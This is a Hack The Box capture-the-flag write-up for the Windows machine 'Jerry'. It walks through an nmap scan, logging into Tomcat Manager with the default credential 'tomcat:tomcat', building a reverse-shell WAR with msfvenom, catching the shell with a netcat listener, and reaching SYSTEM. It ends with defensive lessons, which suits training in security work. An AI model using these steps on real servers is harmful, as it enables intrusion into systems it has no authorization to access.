# Hack The Box - Jerry

## Machine Information

| Field            | Details                                                               |
| ---------------- | --------------------------------------------------------------------- |
| Platform         | Hack The Box                                                          |
| Machine          | Jerry                                                                 |
| Difficulty       | Easy                                                                  |
| Operating System | Windows                                                               |
| Category         | Web Exploitation, Default Credentials, Remote Access                  |
| Main Skills      | Service enumeration, Apache Tomcat exploitation, credential discovery |

---

# Overview

Jerry is a Windows-based machine that demonstrates the danger of using default credentials on exposed services.

The attack path includes:

* Network reconnaissance
* Identifying Apache Tomcat
* Using default credentials
* Uploading a malicious WAR file
* Obtaining a SYSTEM shell

---

# Reconnaissance

The first step was identifying open services.

## Nmap Scan

```bash id="4f8m2v"
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

The scan revealed:

```text id="8n2x5m"
8080/tcp HTTP Apache Tomcat
```

The web service was investigated.

---

# Web Enumeration

Browsing to the service revealed an Apache Tomcat installation.

The Tomcat management interface was discovered:

```text id="3z7q9c"
/manager/html
```

The login page required authentication.

---

# Credential Discovery

Default Tomcat credentials were tested.

Common default credentials include:

```text id="7m4x1p"
tomcat:tomcat
```

Valid credentials were discovered, allowing access to the manager panel.

---

# Exploitation

The Tomcat Manager interface allows deployment of WAR files.

A malicious WAR payload was generated:

```bash id="5w9k3d"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war
```

A listener was started:

```bash id="2x7m5q"
nc -lvnp 4444
```

The WAR file was uploaded through the Tomcat manager interface.

After accessing the deployed application, a reverse shell was received.

---

# Initial Access

The shell provided access to the Windows machine.

The current user was checked:

```cmd id="9v3m8x"
whoami
```

Output:

```text id="4k8p2z"
NT AUTHORITY\SYSTEM
```

The shell already had the highest level of privileges.

---

# Flags

The user flag was located:

```text id="6m2q9w"
C:\Users\<user>\Desktop\user.txt
```

The root/administrator flag was located:

```text id="1x5v8n"
C:\Users\Administrator\Desktop\root.txt
```

---

# Tools Used

* Nmap
* Browser
* Apache Tomcat Manager
* Metasploit
* MSFVenom
* Netcat

---

# Vulnerabilities Identified

## Default Credentials

**Type:** Authentication Weakness

**Impact:**

Default credentials allow unauthorized access to administrative interfaces.

---

## Apache Tomcat Misconfiguration

**Type:** Configuration Vulnerability

**Impact:**

Exposed management interfaces allow attackers to deploy malicious applications.

---

# Lessons Learned

* Default credentials should always be changed before deployment.
* Administrative panels should not be exposed publicly.
* Application servers require secure configuration.
* Service enumeration is essential for identifying attack surfaces.
